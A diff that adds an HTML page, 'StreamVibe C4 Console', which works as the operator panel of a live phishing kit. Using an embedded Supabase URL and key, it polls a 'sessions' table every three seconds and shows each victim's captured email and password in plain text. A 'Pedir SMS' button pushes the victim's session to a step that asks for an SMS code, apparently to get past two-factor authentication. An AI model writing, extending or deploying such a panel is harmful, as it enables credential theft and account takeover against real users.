@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>StreamVibe Console</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body class="bg-zinc-950 text-zinc-400 p-8">
+    <div class="max-w-6xl mx-auto">
+        <header class="flex justify-between items-center mb-10 border-b border-zinc-800 pb-6">
+            <h1 class="text-2xl font-black text-cyan-500 italic uppercase">StreamVibe <span class="text-white">C4 Console</span></h1>
+            <div class="text-xs font-mono">Status: <span class="text-green-500">ONLINE</span></div>
+        </header>
+
+        <div id="list" class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
+            <!-- Cargando sesiones... -->
+        </div>
+    </div>
+
+    <script>
+        const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
+        const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
+        const client = supabase.createClient(S_URL, S_KEY);
+
+        async function load() {
+            const { data } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
+            const list = document.getElementById('list');
+            list.innerHTML = data.map(s => `
+                <div class="bg-zinc-900 border border-zinc-800 p-6 rounded-2xl">
+                    <div class="flex justify-between items-start mb-4">
+                        <span class="text-[10px] font-bold bg-zinc-800 px-2 py-1 rounded">${s.session_id}</span>
+                        <span class="text-[10px] text-cyan-500 uppercase">${s.step}</span>
+                    </div>
+                    <p class="text-white font-bold truncate">${s.email || '---'}</p>
+                    <p class="text-sm text-zinc-500 mb-4">${s.password || '---'}</p>
+                    <div class="flex gap-2">
+                        <input type="text" placeholder="Num" value="${s.target_num || ''}" 
+                               class="w-16 bg-black border border-zinc-700 rounded text-center text-cyan-400 font-bold"
+                               onchange="updateNum('${s.session_id}', this.value)">
+                        <button onclick="changeStep('${s.session_id}', 'sms')" class="flex-1 bg-cyan-600 text-black font-bold text-[10px] rounded uppercase">Pedir SMS</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        async function updateNum(id, val) {
+            await client.from('sessions').update({ target_num: val, updated_at: new Date().toISOString() }).eq('session_id', id);
+        }
+
+        async function changeStep(id, step) {
+            await client.from('sessions').update({ step: step, updated_at: new Date().toISOString() }).eq('session_id', id);
+            load();
+        }
+
+        setInterval(load, 3000);
+        load();
+    </script>
+</body>
+</html>
